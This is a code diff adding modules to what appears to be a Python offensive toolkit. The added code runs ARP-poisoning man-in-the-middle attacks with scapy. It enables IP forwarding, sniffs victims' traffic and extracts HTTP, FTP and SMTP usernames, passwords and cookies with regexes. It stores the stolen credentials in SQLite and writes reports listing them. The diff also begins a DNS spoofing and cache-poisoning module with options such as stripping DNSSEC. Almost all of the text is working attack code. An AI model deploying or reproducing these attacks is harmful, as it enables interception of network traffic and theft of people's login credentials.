-            print(f"{Fore.YELLOW}⚠  pyshark not available (optional){Style.RESET_ALL}")
-        
-        return all_ok
-    
-    def _initialize_packet_sniffer_database(self, config):
-        """Initialize SQLite database for packet capture"""
-        from colorama import Fore, Style
-        import sqlite3
-        import os
-        
-        try:
-            db_path = config['db_file']
-            
-            # Create database
-            conn = sqlite3.connect(db_path)
             cursor = conn.cursor()
             
             # Campaigns table
@@ -39742,15 +36976,13 @@ Success Rate:       {(leases/requests*100) if requests > 0 else 0:.1f}%
                 CREATE TABLE IF NOT EXISTS campaigns (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
                     name TEXT NOT NULL,
+                    target_ip TEXT,
+                    gateway_ip TEXT,
+                    interface TEXT,
                     start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                     end_time TIMESTAMP,
-                    interface TEXT,
-                    filter TEXT,
                     packets_captured INTEGER DEFAULT 0,
-                    bytes_captured INTEGER DEFAULT 0,
-                    alerts_generated INTEGER DEFAULT 0,
                     credentials_found INTEGER DEFAULT 0,
-                    files_extracted INTEGER DEFAULT 0,
                     status TEXT DEFAULT 'active'
                 )
             ''')
@@ -39759,56 +36991,15 @@ Success Rate:       {(leases/requests*100) if requests > 0 else 0:.1f}%
             cursor.execute('''
                 CREATE TABLE IF NOT EXISTS packets (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    campaign_id INTEGER NOT NULL,
-                    timestamp REAL NOT NULL,
-                    src_ip TEXT,
-                    dst_ip TEXT,
-                    src_port INTEGER,
-                    dst_port INTEGER,
-                    protocol TEXT,
-                    length INTEGER,
-                    flags TEXT,
-                    ttl INTEGER,
-                    payload_size INTEGER,
-                    payload TEXT,
-                    FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
-                )
-            ''')
-            
-            # Flows table (TCP/UDP sessions)
-            cursor.execute('''
-                CREATE TABLE IF NOT EXISTS flows (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    campaign_id INTEGER NOT NULL,
-                    start_time REAL NOT NULL,
-                    end_time REAL,
-                    src_ip TEXT NOT NULL,
-                    dst_ip TEXT NOT NULL,
-                    src_port INTEGER,
-                    dst_port INTEGER,
-                    protocol TEXT NOT NULL,
-                    packets_forward INTEGER DEFAULT 0,
-                    packets_backward INTEGER DEFAULT 0,
-                    bytes_forward INTEGER DEFAULT 0,
-                    bytes_backward INTEGER DEFAULT 0,
-                    duration REAL,
-                    state TEXT,
-                    FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
-                )
-            ''')
-            
-            # Alerts table
-            cursor.execute('''
-                CREATE TABLE IF NOT EXISTS alerts (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    campaign_id INTEGER NOT NULL,
-                    timestamp REAL NOT NULL,
-                    alert_type TEXT NOT NULL,
-                    severity TEXT NOT NULL,
+                    campaign_id INTEGER,
+                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                     source_ip TEXT,
-                    destination_ip TEXT,
-                    description TEXT,
-                    details TEXT,
+                    dest_ip TEXT,
+                    protocol TEXT,
+                    source_port INTEGER,
+                    dest_port INTEGER,
+                    payload_size INTEGER,
+                    raw_data BLOB,
                     FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
                 )
             ''')
@@ -39817,11 +37008,11 @@ Success Rate:       {(leases/requests*100) if requests > 0 else 0:.1f}%
             cursor.execute('''
                 CREATE TABLE IF NOT EXISTS credentials (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    campaign_id INTEGER NOT NULL,
-                    timestamp REAL NOT NULL,
-                    protocol TEXT NOT NULL,
-                    source_ip TEXT NOT NULL,
-                    destination_ip TEXT NOT NULL,
+                    campaign_id INTEGER,
+                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    protocol TEXT,
+                    source_ip TEXT,
+                    dest_ip TEXT,
                     username TEXT,
                     password TEXT,
                     additional_data TEXT,
@@ -39829,20 +37020,17 @@ Success Rate:       {(leases/requests*100) if requests > 0 else 0:.1f}%
                 )
             ''')
             
-            # HTTP requests table
+            # Sessions table
             cursor.execute('''
-                CREATE TABLE IF NOT EXISTS http_requests (
+                CREATE TABLE IF NOT EXISTS sessions (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    campaign_id INTEGER NOT NULL,
-                    timestamp REAL NOT NULL,
-                    source_ip TEXT NOT NULL,
-                    method TEXT NOT NULL,
-                    host TEXT,
-                    path TEXT,
-                    user_agent TEXT,
-                    referer TEXT,
+                    campaign_id INTEGER,
+                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    source_ip TEXT,
+                    dest_ip TEXT,
+                    session_id TEXT,
                     cookies TEXT,
-                    headers TEXT,
+                    tokens TEXT,
                     FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
                 )
             ''')
@@ -39851,30 +37039,920 @@ Success Rate:       {(leases/requests*100) if requests > 0 else 0:.1f}%
             cursor.execute('''
                 CREATE TABLE IF NOT EXISTS dns_queries (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    campaign_id INTEGER NOT NULL,
-                    timestamp REAL NOT NULL,
-                    source_ip TEXT NOT NULL,
-                    query_name TEXT NOT NULL,
+                    campaign_id INTEGER,
+                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    source_ip TEXT,
+                    query_domain TEXT,
                     query_type TEXT,
                     response_ip TEXT,
-                    ttl INTEGER,
+                    spoofed BOOLEAN DEFAULT 0,
                     FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
                 )
             ''')
             
-            # Files table
+            # Insert campaign record
             cursor.execute('''
-                CREATE TABLE IF NOT EXISTS extracted_files (
+                INSERT INTO campaigns (name, target_ip, gateway_ip, interface)
+                VALUES (?, ?, ?, ?)
+            ''', (config['campaign_name'], config['target_ip'], config['gateway_ip'], config['interface']))
+            
+            conn.commit()
+            conn.close()
+    
+    
+        def _enable_ip_forwarding(self):
+            """Enable IP forwarding"""
+            import os
+            try:
+                os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+                return True
+            except Exception as e:
+                return False
+    
+    
+        def _backup_arp_tables(self, config):
+            """Backup current ARP tables"""
+            import os
+            from colorama import Fore, Style
+            try:
+                os.system(f"arp -a > arp_backup_{int(time.time())}.txt")
+                print(f"{Fore.GREEN}✓ ARP tables backed up{Style.RESET_ALL}")
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+    
+    
+        def _get_mac_address(self, ip, interface):
+            """Get MAC address for IP"""
+            from scapy.all import ARP, Ether, srp
+            try:
+                arp_request = ARP(pdst=ip)
+                broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+                arp_request_broadcast = broadcast / arp_request
+                answered_list = srp(arp_request_broadcast, timeout=2, verbose=False, iface=interface)[0]
+                
+                if answered_list:
+                    return answered_list[0][1].hwsrc
+                return None
+            except Exception as e:
+                return None
+    
+    
+        def _start_packet_capture(self, config):
+            """Start packet capture in background"""
+            from colorama import Fore, Style
+            import threading
+            
+            def capture_packets():
+                from scapy.all import sniff, wrpcap
+                
+                filter_str = config['capture_filter'] if config['capture_filter'] else None
+                
+                def packet_handler(packet):
+                    # Process packet
+                    self._process_captured_packet(packet, config)
+                
+                try:
+                    packets = sniff(
+                        iface=config['interface'],
+                        filter=filter_str,
+                        prn=packet_handler,
+                        store=True,
+                        count=config['capture_limit'] if config['capture_limit'] > 0 else 0
+                    )
+                    
+                    if config['save_raw_data']:
+                        wrpcap(config['capture_file'], packets)
+                except Exception as e:
+                    print(f"{Fore.RED}✗ Capture error: {str(e)}{Style.RESET_ALL}")
+            
+            capture_thread = threading.Thread(target=capture_packets, daemon=True)
+            capture_thread.start()
+            print(f"{Fore.GREEN}✓ Packet capture started{Style.RESET_ALL}")
+    
+    
+        def _process_captured_packet(self, packet, config):
+            """Process captured packet for credential extraction"""
+            try:
+                # Extract credentials based on protocol
+                if config['enable_credential_harvest']:
+                    if packet.haslayer('TCP'):
+                        payload = bytes(packet['TCP'].payload)
+                        
+                        # HTTP credentials
+                        if config['harvest_http'] and (packet['TCP'].dport == 80 or packet['TCP'].sport == 80):
+                            self._extract_http_credentials(packet, payload, config)
+                        
+                        # FTP credentials
+                        if config['harvest_ftp'] and (packet['TCP'].dport == 21 or packet['TCP'].sport == 21):
+                            self._extract_ftp_credentials(packet, payload, config)
+                        
+                        # SMTP credentials
+                        if config['harvest_smtp'] and (packet['TCP'].dport == 25 or packet['TCP'].sport == 25):
+                            self._extract_smtp_credentials(packet, payload, config)
+                
+                # Extract cookies
+                if config['harvest_cookies']:
+                    self._extract_cookies(packet, config)
+                
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+    
+    
+        def _extract_http_credentials(self, packet, payload, config):
+            """Extract HTTP credentials from packet"""
+            from colorama import Fore, Style
+            try:
+                payload_str = payload.decode('utf-8', errors='ignore')
+                
+                # Look for POST data
+                if 'POST' in payload_str:
+                    # Extract username/password patterns
+                    import re
+                    
+                    username_patterns = [
+                        r'username=([^&\s]+)',
+                        r'user=([^&\s]+)',
+                        r'login=([^&\s]+)',
+                        r'email=([^&\s]+)'
+                    ]
+                    
+                    password_patterns = [
+                        r'password=([^&\s]+)',
+                        r'pass=([^&\s]+)',
+                        r'pwd=([^&\s]+)'
+                    ]
+                    
+                    username = None
+                    password = None
+                    
+                    for pattern in username_patterns:
+                        match = re.search(pattern, payload_str, re.IGNORECASE)
+                        if match:
+                            username = match.group(1)
+                            break
+                    
+                    for pattern in password_patterns:
+                        match = re.search(pattern, payload_str, re.IGNORECASE)
+                        if match:
+                            password = match.group(1)
+                            break
+                    
+                    if username and password:
+                        print(f"\n{Fore.GREEN}[+] HTTP CREDENTIALS FOUND:{Style.RESET_ALL}")
+                        print(f"    Source: {packet['IP'].src}")
+                        print(f"    Username: {username}")
+                        print(f"    Password: {password}\n")
+                        
+                        # Store in database
+                        if config['enable_database']:
+                            self._store_credentials(config, 'HTTP', packet['IP'].src, packet['IP'].dst, username, password)
+            
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+    
+    
+        def _extract_ftp_credentials(self, packet, payload, config):
+            """Extract FTP credentials"""
+            from colorama import Fore, Style
+            try:
+                payload_str = payload.decode('utf-8', errors='ignore')
+                
+                if 'USER ' in payload_str:
+                    username = payload_str.split('USER ')[1].strip()
+                    print(f"\n{Fore.GREEN}[+] FTP USERNAME: {username}{Style.RESET_ALL}")
+                
+                if 'PASS ' in payload_str:
+                    password = payload_str.split('PASS ')[1].strip()
+                    print(f"{Fore.GREEN}[+] FTP PASSWORD: {password}{Style.RESET_ALL}\n")
+                    
+                    if config['enable_database']:
+                        self._store_credentials(config, 'FTP', packet['IP'].src, packet['IP'].dst, 'ftp_user', password)
+            
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+    
+    
+        def _extract_smtp_credentials(self, packet, payload, config):
+            """Extract SMTP credentials"""
+            try:
+                payload_str = payload.decode('utf-8', errors='ignore')
+                
+                if 'AUTH LOGIN' in payload_str or 'AUTH PLAIN' in payload_str:
+                    # SMTP authentication detected
+                    pass
+            
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+    
+    
+        def _extract_cookies(self, packet, config):
+            """Extract cookies from HTTP traffic"""
+            try:
+                if packet.haslayer('TCP'):
+                    payload = bytes(packet['TCP'].payload).decode('utf-8', errors='ignore')
+                    
+                    if 'Cookie:' in payload:
+                        import re
+                        cookies = re.findall(r'Cookie: (.+)', payload)
+                        if cookies:
+                            # Store cookies
+                            pass
+            
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+    
+    
+        def _store_credentials(self, config, protocol, source_ip, dest_ip, username, password):
+            """Store credentials in database"""
+            import sqlite3
+            try:
+                conn = sqlite3.connect(config['db_file'])
+                cursor = conn.cursor()
+                
+                cursor.execute('''
+                    INSERT INTO credentials (campaign_id, protocol, source_ip, dest_ip, username, password)
+                    VALUES (1, ?, ?, ?, ?, ?)
+                ''', (protocol, source_ip, dest_ip, username, password))
+                
+                conn.commit()
+                conn.close()
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+    
+    
+        def _arp_poison_loop(self, config, target_mac, gateway_mac):
+            """Main ARP poisoning loop"""
+            from scapy.all import ARP, send
+            from colorama import Fore, Style
+            import time
+            import random
+            
+            packet_count = 0
+            start_time = time.time()
+            
+            try:
+                while True:
+                    # Poison target
+                    arp_target = ARP(op=2, pdst=config['target_ip'], hwdst=target_mac, psrc=config['gateway_ip'])
+                    
+                    # Poison gateway (bidirectional)
+                    if config['mode'] == 'bidirectional':
+                        arp_gateway = ARP(op=2, pdst=config['gateway_ip'], hwdst=gateway_mac, psrc=config['target_ip'])
+                        send(arp_gateway, verbose=False, iface=config['interface'])
+                    
+                    send(arp_target, verbose=False, iface=config['interface'])
+                    
+                    packet_count += 2 if config['mode'] == 'bidirectional' else 1
+                    
+                    # Display progress
+                    elapsed = int(time.time() - start_time)
+                    print(f"\r{Fore.CYAN}[{elapsed}s] ARP packets sent: {packet_count}{Style.RESET_ALL}", end='', flush=True)
+                    
+                    # Check auto-stop timer
+                    if config['auto_stop_timer'] > 0 and elapsed >= config['auto_stop_timer']:
+                        print(f"\n\n{Fore.YELLOW}⚠  Auto-stop timer reached{Style.RESET_ALL}")
+                        break
+                    
+                    # Sleep with randomization
+                    sleep_time = config['poison_interval']
+                    if config['randomize_timing']:
+                        sleep_time += random.uniform(-0.5, 0.5)
+                    
+                    time.sleep(max(0.1, sleep_time))
+                    
+                    # Check poison count limit
+                    if config['poison_count'] > 0 and packet_count >= config['poison_count']:
+                        print(f"\n\n{Fore.YELLOW}⚠  Poison count limit reached{Style.RESET_ALL}")
+                        break
+            
+            except KeyboardInterrupt as e:
+                # Silently handle KeyboardInterrupt
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] KeyboardInterrupt: {e}")
+            
+            print(f"\n\n{Fore.YELLOW}━━━ STOPPING MITM ATTACK ━━━{Style.RESET_ALL}\n")
+    
+    
+        def _cleanup_arp_spoof(self, config):
+            """Cleanup and restore network"""
+            from colorama import Fore, Style
+            
+            if config['restore_arp']:
+                print(f"{Fore.CYAN}→ Restoring ARP tables...{Style.RESET_ALL}")
+                self._restore_arp_tables(config)
+                print(f"{Fore.GREEN}✓ ARP tables restored{Style.RESET_ALL}")
+            
+            # Generate final report
+            if config['generate_report']:
+                print(f"{Fore.CYAN}→ Generating final report...{Style.RESET_ALL}")
+                self._generate_mitm_report(config)
+                print(f"{Fore.GREEN}✓ Report generated{Style.RESET_ALL}")
+            
+            print(f"\n{Fore.GREEN}✓ Cleanup completed{Style.RESET_ALL}\n")
+    
+    
+        def _restore_arp_tables(self, config):
+            """Restore original ARP tables"""
+            from scapy.all import ARP, send
+            import time
+            try:
+                # Get original MACs
+                target_mac = self._get_mac_address(config['target_ip'], config['interface'])
+                gateway_mac = self._get_mac_address(config['gateway_ip'], config['interface'])
+                
+                if target_mac and gateway_mac:
+                    # Restore target
+                    arp_restore_target = ARP(op=2, pdst=config['target_ip'], hwdst=target_mac, 
+                                            psrc=config['gateway_ip'], hwsrc=gateway_mac)
+                    
+                    # Restore gateway
+                    arp_restore_gateway = ARP(op=2, pdst=config['gateway_ip'], hwdst=gateway_mac,
+                                             psrc=config['target_ip'], hwsrc=target_mac)
+                    
+                    # Send multiple times to ensure restoration
+                    for _ in range(5):
+                        send(arp_restore_target, verbose=False, iface=config['interface'])
+                        send(arp_restore_gateway, verbose=False, iface=config['interface'])
+                        time.sleep(0.2)
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+    
+    
+        def _generate_mitm_report(self, config):
+            """Generate MITM operation report"""
+            import sqlite3
+            from colorama import Fore, Style
+            
+            formats = config['report_format']
+            if formats == 'all':
+                formats = ['txt', 'json', 'html']
+            else:
+                formats = [formats]
+            
+            for fmt in formats:
+                report_file = f"mitm_report_{config['campaign_name']}.{fmt}"
+                
+                if fmt == 'txt':
+                    self._generate_mitm_txt_report(config, report_file)
+                elif fmt == 'json':
+                    self._generate_mitm_json_report(config, report_file)
+                elif fmt == 'html':
+                    self._generate_mitm_html_report(config, report_file)
+    
+    
+        def _generate_mitm_txt_report(self, config, output_file):
+            """Generate text report"""
+            import sqlite3
+            import time
+            
+            content = f"""ARP SPOOF & MITM OPERATION - FINAL REPORT
+    {'=' * 70}
+    
+    Campaign: {config['campaign_name']}
+    Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}
+    
+    TARGET INFORMATION
+    ------------------
+    Target IP:      {config['target_ip']}
+    Gateway IP:     {config['gateway_ip']}
+    Interface:      {config['interface']}
+    Mode:           {config['mode']}
+    
+    MITM ATTACKS
+    ------------
+    Packet Capture:         {config['enable_packet_capture']}
+    SSL Stripping:          {config['enable_ssl_strip']}
+    DNS Spoofing:           {config['enable_dns_spoof']}
+    Credential Harvesting:  {config['enable_credential_harvest']}
+    
+    """
+            
+            # Get statistics from database
+            if config['enable_database']:
+                try:
+                    conn = sqlite3.connect(config['db_file'])
+                    cursor = conn.cursor()
+                    
+                    cursor.execute('SELECT COUNT(*) FROM credentials WHERE campaign_id = 1')
+                    cred_count = cursor.fetchone()[0]
+                    
+                    cursor.execute('SELECT COUNT(*) FROM packets WHERE campaign_id = 1')
+                    packet_count = cursor.fetchone()[0]
+                    
+                    content += f"""STATISTICS
+    ----------
+    Packets Captured:   {packet_count}
+    Credentials Found:  {cred_count}
+    
+    """
+                    
+                    # List credentials
+                    if cred_count > 0:
+                        content += "CAPTURED CREDENTIALS\n"
+                        content += "-" * 70 + "\n"
+                        
+                        cursor.execute('SELECT protocol, source_ip, username, password, timestamp FROM credentials WHERE campaign_id = 1')
+                        for row in cursor.fetchall():
+                            content += f"\n[{row[4]}] {row[0]}\n"
+                            content += f"  Source: {row[1]}\n"
+                            content += f"  Username: {row[2]}\n"
+                            content += f"  Password: {row[3]}\n"
+                    
+                    conn.close()
+                except Exception as e:
+                    # Silently handle exception - consider logging in production
+                    if hasattr(self, "debug") and getattr(self, "debug", False):
+                        print(f"[DEBUG] Exception: {e}")
+            
+            with open(output_file, 'w') as f:
+                f.write(content)
+    
+    
+        def _generate_mitm_json_report(self, config, output_file):
+            """Generate JSON report"""
+            import json
+            import sqlite3
+            import time
+            
+            report = {
+                'campaign': config['campaign_name'],
+                'timestamp': time.time(),
+                'target': {
+                    'ip': config['target_ip'],
+                    'gateway': config['gateway_ip'],
+                    'interface': config['interface']
+                },
+                'configuration': {
+                    'mode': config['mode'],
+                    'ssl_strip': config['enable_ssl_strip'],
+                    'dns_spoof': config['enable_dns_spoof'],
+                    'credential_harvest': config['enable_credential_harvest']
+                },
+                'credentials': [],
+                'statistics': {}
+            }
+            
+            # Get data from database
+            if config['enable_database']:
+                try:
+                    conn = sqlite3.connect(config['db_file'])
+                    cursor = conn.cursor()
+                    
+                    cursor.execute('SELECT protocol, source_ip, dest_ip, username, password, timestamp FROM credentials WHERE campaign_id = 1')
+                    for row in cursor.fetchall():
+                        report['credentials'].append({
+                            'protocol': row[0],
+                            'source_ip': row[1],
+                            'dest_ip': row[2],
+                            'username': row[3],
+                            'password': row[4],
+                            'timestamp': row[5]
+                        })
+                    
+                    conn.close()
+                except Exception as e:
+                    # Silently handle exception - consider logging in production
+                    if hasattr(self, "debug") and getattr(self, "debug", False):
+                        print(f"[DEBUG] Exception: {e}")
+            
+            with open(output_file, 'w') as f:
+                json.dump(report, f, indent=2)
+    
+    
+        def _generate_mitm_html_report(self, config, output_file):
+            """Generate HTML report"""
+            import time
+            
+            html = f"""<!DOCTYPE html>
+    <html>
+    <head>
+        <title>MITM Report - {config['campaign_name']}</title>
+        <style>
+            body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
+            .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; }}
+            h1 {{ color: #333; border-bottom: 3px solid #e74c3c; padding-bottom: 10px; }}
+            .stats {{ display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin: 20px 0; }}
+            .stat-card {{ background: #f9f9f9; padding: 20px; border-radius: 5px; text-align: center; }}
+            .stat-value {{ font-size: 32px; font-weight: bold; color: #e74c3c; }}
+            .stat-label {{ color: #666; margin-top: 10px; }}
+            .credential {{ background: #fff3cd; padding: 10px; margin: 10px 0; border-left: 4px solid #ffc107; }}
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>MITM Operation Report</h1>
+            <p><strong>Campaign:</strong> {config['campaign_name']}</p>
+            <p><strong>Generated:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
+            
+            <h2>Target Information</h2>
+            <table border="1" style="width:100%; border-collapse: collapse;">
+                <tr><td><strong>Target IP</strong></td><td>{config['target_ip']}</td></tr>
+                <tr><td><strong>Gateway IP</strong></td><td>{config['gateway_ip']}</td></tr>
+                <tr><td><strong>Interface</strong></td><td>{config['interface']}</td></tr>
+                <tr><td><strong>Mode</strong></td><td>{config['mode']}</td></tr>
+            </table>
+            
+            <h2>MITM Attacks Enabled</h2>
+            <ul>
+                <li>Packet Capture: {config['enable_packet_capture']}</li>
+                <li>SSL Stripping: {config['enable_ssl_strip']}</li>
+                <li>DNS Spoofing: {config['enable_dns_spoof']}</li>
+                <li>Credential Harvesting: {config['enable_credential_harvest']}</li>
+            </ul>
+        </div>
+    </body>
+    </html>"""
+            
+            with open(output_file, 'w') as f:
+                f.write(html)
+        
+        def run_dns_spoof(self):
+            """
+            Enterprise DNS Spoofing & Cache Poisoning Platform
+            Main orchestrator for DNS manipulation operations
+            """
+            from colorama import Fore, Style
+            import socket
+            import struct
+            import threading
+            import time
+            
+            print(f"\n{Fore.CYAN}{'=' * 70}")
+            print(f"  DNS SPOOF & CACHE POISONING PLATFORM - ENTERPRISE EDITION")
+            print(f"{'=' * 70}{Style.RESET_ALL}\n")
+            
+            # Check for scapy
+            try:
+                from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, sniff, send, sr1
+                SCAPY_AVAILABLE = True
+            except ImportError:
+                print(f"{Fore.RED}✗ ERROR: Scapy not available{Style.RESET_ALL}")
+                print(f"{Fore.BLUE}ℹ  Install: pip3 install scapy{Style.RESET_ALL}\n")
+                return
+            
+            # Check root privileges
+            import os
+            if os.geteuid() != 0:
+                print(f"{Fore.RED}✗ ERROR: Root privileges required{Style.RESET_ALL}")
+                print(f"{Fore.BLUE}ℹ  Run with: sudo python3 kndys.py{Style.RESET_ALL}\n")
+                return
+            
+            # Load configuration
+            config = self._load_dns_spoof_config()
+            if not config:
+                print(f"{Fore.RED}✗ ERROR: Failed to load configuration{Style.RESET_ALL}")
+                return
+            
+            # Display configuration
+            self._display_dns_spoof_config(config)
+            
+            # Confirm operation
+            if config['confirm_spoof']:
+                response = input(f"\n{Fore.YELLOW}⚠  Proceed with DNS spoofing? (yes/no): {Style.RESET_ALL}")
+                if response.lower() not in ['yes', 'y']:
+                    print(f"{Fore.BLUE}ℹ  Operation cancelled{Style.RESET_ALL}")
+                    return
+            
+            # Initialize database
+            if config['enable_database']:
+                try:
+                    self._initialize_dns_database(config)
+                    print(f"\n{Fore.GREEN}✓ Database initialized{Style.RESET_ALL}")
+                except Exception as e:
+                    print(f"\n{Fore.YELLOW}⚠ WARNING: Database init failed - continuing without DB{Style.RESET_ALL}")
+            
+            # Initialize cache
+            if config['enable_cache']:
+                self._initialize_dns_cache(config)
+                print(f"{Fore.GREEN}✓ DNS cache initialized ({config['cache_size']} entries){Style.RESET_ALL}")
+            
+            # Load spoof domains
+            spoof_domains = self._load_spoof_domains(config)
+            if not spoof_domains and not config['wildcard_mode']:
+                print(f"\n{Fore.RED}✗ ERROR: No domains to spoof{Style.RESET_ALL}")
+                print(f"{Fore.BLUE}ℹ  Set 'spoof_domains' or enable 'wildcard_mode'{Style.RESET_ALL}")
+                return
+            
+            print(f"{Fore.GREEN}✓ Loaded {len(spoof_domains)} spoof domains{Style.RESET_ALL}")
+            
+            # Setup signal handlers
+            import signal
+            import sys
+            
+            def signal_handler(sig, frame):
+                print(f"\n\n{Fore.YELLOW}⚠  Interrupt received - cleaning up...{Style.RESET_ALL}\n")
+                self._cleanup_dns_spoof(config)
+                sys.exit(0)
+            
+            signal.signal(signal.SIGINT, signal_handler)
+            signal.signal(signal.SIGTERM, signal_handler)
+            
+            # Start DNS spoofing
+            print(f"\n{Fore.CYAN}━━━ STARTING DNS SPOOFING ━━━{Style.RESET_ALL}\n")
+            print(f"{Fore.YELLOW}→ Interface: {config['interface']}{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}→ Spoof IP: {config['spoof_ip']}{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}→ Wildcard Mode: {config['wildcard_mode']}{Style.RESET_ALL}")
+            print(f"{Fore.GREEN}→ DNS spoofing active - press Ctrl+C to stop{Style.RESET_ALL}\n")
+            
+            # Main spoofing loop
+            self._dns_spoof_loop(config, spoof_domains)
+    
+    
+        def _load_dns_spoof_config(self):
+            """Load and validate DNS spoof configuration"""
+            try:
+                config = {
+                    # Core
+                    'campaign_name': str(self.module_options.get('campaign_name', 'dns_operation')),
+                    'interface': str(self.module_options.get('interface', 'eth0')),
+                    'listen_port': int(self.module_options.get('listen_port', '53')),
+                    'bind_ip': str(self.module_options.get('bind_ip', '0.0.0.0')),
+                    'enable_ipv6': self._parse_bool(self.module_options.get('enable_ipv6', 'false')),
+                    'protocol': str(self.module_options.get('protocol', 'both')),
+                    
+                    # Target domains
+                    'spoof_domains': str(self.module_options.get('spoof_domains', '')),
+                    'spoof_ip': str(self.module_options.get('spoof_ip', '192.168.1.100')),
+                    'spoof_ipv6': str(self.module_options.get('spoof_ipv6', '::1')),
+                    'wildcard_mode': self._parse_bool(self.module_options.get('wildcard_mode', 'false')),
+                    'subdomain_mode': self._parse_bool(self.module_options.get('subdomain_mode', 'false')),
+                    'regex_patterns': str(self.module_options.get('regex_patterns', '')),
+                    'domain_file': str(self.module_options.get('domain_file', '')),
+                    
+                    # Response types
+                    'response_type': str(self.module_options.get('response_type', 'A')),
+                    'ttl': int(self.module_options.get('ttl', '300')),
+                    'multiple_ips': str(self.module_options.get('multiple_ips', '')),
+                    'cname_target': str(self.module_options.get('cname_target', '')),
+                    'mx_priority': int(self.module_options.get('mx_priority', '10')),
+                    'txt_record': str(self.module_options.get('txt_record', '')),
+                    'ns_server': str(self.module_options.get('ns_server', '')),
+                    
+                    # Conditional spoofing
+                    'source_ip_filter': str(self.module_options.get('source_ip_filter', '')),
+                    'exclude_ips': str(self.module_options.get('exclude_ips', '')),
+                    'time_based_spoof': self._parse_bool(self.module_options.get('time_based_spoof', 'false')),
+                    'spoof_schedule': str(self.module_options.get('spoof_schedule', '')),
+                    'query_count_trigger': int(self.module_options.get('query_count_trigger', '0')),
+                    'random_spoof': self._parse_bool(self.module_options.get('random_spoof', 'false')),
+                    'spoof_probability': int(self.module_options.get('spoof_probability', '100')),
+                    
+                    # Upstream DNS
+                    'upstream_dns': str(self.module_options.get('upstream_dns', '8.8.8.8')),
+                    'fallback_dns': str(self.module_options.get('fallback_dns', '1.1.1.1')),
+                    'upstream_timeout': int(self.module_options.get('upstream_timeout', '5')),
+                    'dns_over_https': self._parse_bool(self.module_options.get('dns_over_https', 'false')),
+                    'doh_endpoint': str(self.module_options.get('doh_endpoint', 'https://cloudflare-dns.com/dns-query')),
+                    'dns_over_tls': self._parse_bool(self.module_options.get('dns_over_tls', 'false')),
+                    'dot_server': str(self.module_options.get('dot_server', '1.1.1.1')),
+                    'query_upstream_first': self._parse_bool(self.module_options.get('query_upstream_first', 'true')),
+                    
+                    # Cache management
+                    'enable_cache': self._parse_bool(self.module_options.get('enable_cache', 'true')),
+                    'cache_size': int(self.module_options.get('cache_size', '10000')),
+                    'cache_ttl': int(self.module_options.get('cache_ttl', '300')),
+                    'negative_cache': self._parse_bool(self.module_options.get('negative_cache', 'true')),
+                    'negative_cache_ttl': int(self.module_options.get('negative_cache_ttl', '60')),
+                    'cache_persistence': self._parse_bool(self.module_options.get('cache_persistence', 'false')),
+                    'cache_file': str(self.module_options.get('cache_file', 'dns_cache.json')),
+                    'preload_cache': self._parse_bool(self.module_options.get('preload_cache', 'false')),
+                    'cache_warmup': self._parse_bool(self.module_options.get('cache_warmup', 'false')),
+                    
+                    # DNSSEC
+                    'strip_dnssec': self._parse_bool(self.module_options.get('strip_dnssec', 'true')),
+                    'dnssec_validation': self._parse_bool(self.module_options.get('dnssec_validation', 'false')),
+                    'forge_dnssec': self._parse_bool(self.module_options.get('forge_dnssec', 'false')),
+                    'ad_flag': self._parse_bool(self.module_options.get('ad_flag', 'false')),
+                    
+                    # Response manipulation
+                    'modify_responses': self._parse_bool(self.module_options.get('modify_responses', 'false')),
+                    'inject_additional': self._parse_bool(self.module_options.get('inject_additional', 'false')),
+                    'additional_records': str(self.module_options.get('additional_records', '')),
+                    'force_recursion': self._parse_bool(self.module_options.get('force_recursion', 'false')),
